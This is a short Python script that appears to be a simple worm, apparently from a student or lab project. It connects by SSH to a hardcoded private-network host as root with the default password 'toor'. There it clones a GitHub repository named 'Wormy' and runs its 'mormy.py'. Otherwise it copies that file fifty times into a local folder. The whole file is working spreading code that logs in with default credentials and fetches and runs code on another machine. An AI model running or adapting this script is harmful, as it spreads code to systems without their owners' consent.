#!/usr/bin/env python

import os
import sys
import paramiko
from shutil import copyfile
if __name__ == "__main__":
    password = 'toor'
    username = 'root'
    host = '10.42.0.243'
    port = 22
    if sys.argv[1] == '1':
        print ('lets not corrupt our cpu')
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host,username = username, password = password)
            stdin, stdout, stderr = client.exec_command("cd Documents\ngit clone https://github.com/Timothyyung/Wormy\ncd Wormy\npython3 mormy.py")
            print (stdout.read())
        
        finally:
            client.close()
            

    else:
        for i in range (0,50):
            dst = '/Documents/wormy' + str(i) + '.py'
            copyfile('./mormy.py',dst)    
    
